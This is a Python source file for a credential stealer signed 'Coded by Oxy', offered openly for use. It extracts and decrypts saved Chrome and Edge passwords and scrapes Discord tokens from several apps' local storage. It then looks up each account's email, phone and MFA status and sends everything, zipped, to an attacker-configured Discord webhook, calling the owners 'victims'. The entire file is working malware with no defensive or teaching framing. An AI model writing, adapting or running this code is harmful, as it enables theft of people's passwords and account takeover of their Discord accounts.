######################################
#                                    #
#           Coded by Oxy             #
#                                    #          
#         Professional skid          #           
#                                    #           
######################################

from Crypto.Cipher import AES
from urllib.request import Request, urlopen
from re import findall
from io import BytesIO
from zipfile import ZipFile

import os
import json
import base64
import shutil
import threading
import sqlite3
import win32crypt

from dhooks import *

userid = '' # - ( Input your discord tag if you want to be pinged ! )
webhookurl = Webhook("") 
             # - ( Input your webhook URL inside the string 
             # - .. it will literally not work if you don't ! )

passwords = [] # - ( Initialize both of the tables that
tokens = []    # - .. will be used for storing the victims data )

class Browser:
    class Browsers:
        class Chrome:
            def fetchEncryptionKey():
                localStatePath = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
                
                with open(localStatePath, 'r', encoding='utf_8') as f:
                    localStateData = f.read()
                    localStateData = json.loads(localStateData)

                encryptionKey = base64.b64decode(localStateData['os_crypt']['encrypted_key'])
                encryptionKey = encryptionKey[5:]

                return win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]

            def passwordDecryption(password, encryptionKey):
                try:
                    iv = password[3:15]
                    password = password[15:]

                    cipher = AES.new(encryptionKey, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return None

            def fetchChromeData():
                key = Browser.Browsers.Chrome.fetchEncryptionKey()
                dbPath = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'default', 'Login Data')

                fileName = "x.db"
                shutil.copyfile(dbPath, fileName)

                db = sqlite3.connect(fileName)
                cursor = db.cursor()

                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                    "order by date_last_used"
                )

                for row in cursor.fetchall():  
                    passwordCombo = []

                    mainUrl = row[0]
                    userName = row[2]
                    passWord = Browser.Browsers.Chrome.passwordDecryption(row[3], key)
                    dateOfCreation = row[4]
                    lastUsage = row[5]

                    if userName or passWord:
                        passwordCombo.append(mainUrl)
                        passwordCombo.append(userName)
                        passwordCombo.append(passWord)

                        passwords.append(passwordCombo)

                cursor.close()
                db.close()

                try:
                    os.remove("./x.db")
                except Exception as ex:
                    pass
        class Edge:
            def getMasterKey():
                try:
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', 'r', encoding='utf-8') as f:
                        localState = f.read()
                        localState = json.loads(localState)
                    masterKey = base64.b64decode(localState['os_crypt']['encrypted_key'])
                    masterKey = masterKey[5:]
                    masterKey = win32crypt.CryptUnprotectData(masterKey, None, None, None, 0)[1]

                    return masterKey
                except:
                    pass
            
            def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)


            def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)


            def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = Browser.Browsers.Edge.generate_cipher(master_key, iv)
                    decrypted_pass = Browser.Browsers.Edge.decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode() 

                    return decrypted_pass
                except Exception as e:
                    return "Chrome < 80"

            def fetchEdgeData():
                masterKey = Browser.Browsers.Edge.getMasterKey()
                loginDB = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'

                shutil.copy2(loginDB, "z.db")

                conn = sqlite3.connect("z.db")
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                    for result in cursor.fetchall():               
                        passwordCombo = []

                        url = result[0]
                        username = result[1]
                        encrypted = result[2]
                        password = Browser.Browsers.Edge.decrypt_password(encrypted, masterKey)

                        if username or password:
                            passwordCombo.append(url)
                            passwordCombo.append(username)
                            passwordCombo.append(password)

                            passwords.append(passwordCombo)

                    cursor.close()
                    conn.close()

                    try:
                        os.remove("z.db")
                    except:
                        pass
                except:
                    pass
    
    class Main:
        def setup():
            Browser.Browsers.Chrome.fetchChromeData()
            Browser.Browsers.Edge.fetchEdgeData()

class Discord:
    class Tokens:
        def getheaders(token=None):
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }

            if token:
                headers.update({"Authorization": token})
            return headers

        def getuserdata(token):
            try:
                return json.loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=Discord.Tokens.getheaders(token))).read().decode())
            except:
                pass

        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens

        def returntokens():
            try:
                LOCAL = os.getenv("LOCALAPPDATA")
                ROAMING = os.getenv("APPDATA")
            except:
                pass

            PATHS = {
                "Discord"           : ROAMING + "\\Discord",
                "Discord Canary"    : ROAMING + "\\discordcanary",
                "Discord PTB"       : ROAMING + "\\discordptb",
                "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
                "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            }

            cache_path = ROAMING + "\\.cache~$"
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in Discord.Tokens.gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = base64.b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = Discord.Tokens.getuserdata(token)
                    if not user_data:
                        continue

                    if not token in working:
                        tokens.append(token)

    class Main:
        def setup():
            Discord.Tokens.returntokens()

Discord.Main.setup()

# - Get all of the Discord tokens

# - ( Main Discord.Main.setup() runs the token logger
#  - .. and saves the output to the tokens table )

Browser.Main.setup()

# - Get all of the browser passwords

# - ( Main Browser.Main.setup() runs the password logger
# - .. and saves the output to the passwords table )

webhookEmbed = Embed(
    description = f"**oxy | New hit!**",
    color = 0x7127C4
)

webhookEmbed.set_footer(text='coded by oxy * <3')

for token in tokens:
    userData = Discord.Tokens.getuserdata(token)

    userName = userData['username']
    userDiscriminator = userData['discriminator']

    userEmail = userData['email']
    userPhone = userData['phone']

    userLocale = userData['locale']
    userMFA = userData['mfa_enabled']
    userNSFW = userData['nsfw_allowed']

    userVerified = userData['verified']

    webhookEmbed.add_field(name = f"||{token}||", value = f"""
```
Username: {userName}
Tag: {userDiscriminator}
Email: {userEmail}
Phone: {userPhone}
MFA: {userMFA}
Locale: {userLocale}
NSFW: {userNSFW}
Verified: {userVerified}
ID: {userData['id']}
```
"""
    , inline = False)

webhookurl.modify(name="oxy")

passwordsFile = open('b.txt', 'a')
passwordsFile.write("oxy logger * pwds \n\n")

for combo in passwords:
    passwordsFile.write(f"""
##############################################
# 
# URL: {combo[0]}
# Username: {combo[1]}
# Password: {combo[2]} 
#  """)

passwordsFile.write("""
##############################################""")

passwordsFile.close()

with ZipFile('b.zip', 'w') as zip:
    zip.write('b.txt')

webhookurl.send(embed=webhookEmbed, content=f"<@{userid}>", file=File('b.zip', name='pwds.zip'))

try:
    os.remove('b.zip')
    os.remove('b.txt')
except:
    pass
